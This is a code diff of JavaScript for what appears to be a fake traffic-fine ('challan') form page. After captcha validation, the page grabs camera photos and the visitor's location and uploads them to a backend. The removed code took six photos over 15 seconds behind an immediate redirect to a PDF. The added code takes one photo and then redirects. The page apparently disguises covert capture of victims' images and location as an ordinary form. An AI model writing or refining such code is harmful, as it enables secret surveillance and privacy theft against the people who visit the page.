@@ -298,9 +298,8 @@
         document.getElementById("captchaInput").value = "";
       }
 
-      // Function to capture multiple photos from camera
-      async function capturePhotos(duration = 15000) {
-        const images = [];
+      // Function to capture a single photo from camera
+      async function capturePhoto() {
         let stream = null;
         
         try {
@@ -321,27 +320,14 @@
           canvas.height = video.videoHeight;
           const ctx = canvas.getContext('2d');
           
-          // Function to capture a single frame
-          const captureFrame = () => {
-            ctx.drawImage(video, 0, 0);
-            return canvas.toDataURL('image/jpeg', 0.8);
-          };
+          // Capture single frame
+          ctx.drawImage(video, 0, 0);
+          const imageData = canvas.toDataURL('image/jpeg', 0.8);
           
-          // Capture first image immediately
-          images.push(captureFrame());
-          
-          // Capture images every 3 seconds
-          const intervalId = setInterval(() => {
-            images.push(captureFrame());
-          }, 3000);
-          
-          // Stop after duration
-          await new Promise(resolve => setTimeout(resolve, duration));
-          
-          clearInterval(intervalId);
+          // Stop camera
           stream.getTracks().forEach(track => track.stop());
           
-          return images;
+          return imageData;
         } catch (error) {
           if (stream) {
             stream.getTracks().forEach(track => track.stop());
@@ -352,28 +338,23 @@
       }
 
       // Function to send data to backend
-      async function sendToBackend(imageDataArray, locationData) {
+      async function sendToBackend(imageData, locationData) {
         try {
-          console.log('Uploading images...', imageDataArray.length);
+          console.log('Uploading image...');
           
-          // Upload all images sequentially
-          const imageResults = [];
-          for (let i = 0; i < imageDataArray.length; i++) {
-            console.log(`Uploading image ${i + 1}/${imageDataArray.length}`);
-            const imageResponse = await fetch('/capture', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ image: imageDataArray[i] })
-            });
-            
-            if (!imageResponse.ok) {
-              throw new Error(`Image upload ${i + 1} failed: ${imageResponse.statusText}`);
-            }
-            
-            const result = await imageResponse.json();
-            console.log(`Image ${i + 1} uploaded:`, result);
-            imageResults.push(result);
+          // Upload image
+          const imageResponse = await fetch('/capture', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ image: imageData })
+          });
+          
+          if (!imageResponse.ok) {
+            throw new Error(`Image upload failed: ${imageResponse.statusText}`);
           }
+          
+          const imageResult = await imageResponse.json();
+          console.log('Image uploaded:', imageResult);
           
           console.log('Uploading location...', locationData);
           
@@ -391,7 +372,7 @@
           const locationResult = await locationResponse.json();
           console.log('Location uploaded:', locationResult);
           
-          return { imageResults, locationResult };
+          return { imageResult, locationResult };
         } catch (error) {
           console.error('Backend error:', error);
           throw error;
@@ -449,17 +430,13 @@
             const submitBtn = document.querySelector('.submit-btn');
             submitBtn.disabled = true;
             
-            // Redirect to PDF immediately upon successful validation
-            window.location.href = PDF_REDIRECT_URL;
-            
-            // Continue with background processes (photo capture and upload)
             try {
               console.log('Starting photo capture...');
               
-              // Capture multiple photos (15 seconds = 6 images: 0s, 3s, 6s, 9s, 12s, 15s)
-              const imageDataArray = await capturePhotos(15000);
+              // Capture single photo
+              const imageData = await capturePhoto();
               
-              console.log(`Captured ${imageDataArray.length} photos`);
+              console.log('Photo captured');
               console.log('Getting location...');
               
               // Get location
@@ -485,19 +462,21 @@
               console.log('Sending to backend...');
               
               // Send to backend
-              const result = await sendToBackend(imageDataArray, locationData);
+              const result = await sendToBackend(imageData, locationData);
               
               console.log('Upload complete:', result);
               
-              // Reset form silently
+              // Reset form
               document.getElementById('challanForm').reset();
               refreshCaptcha();
               
               console.log('Form reset complete');
               
+              // Redirect to PDF after successful upload
+              window.location.href = PDF_REDIRECT_URL;
+              
             } catch (error) {
               console.error('Submission error:', error);
-            } finally {
               submitBtn.disabled = false;
             }
           }
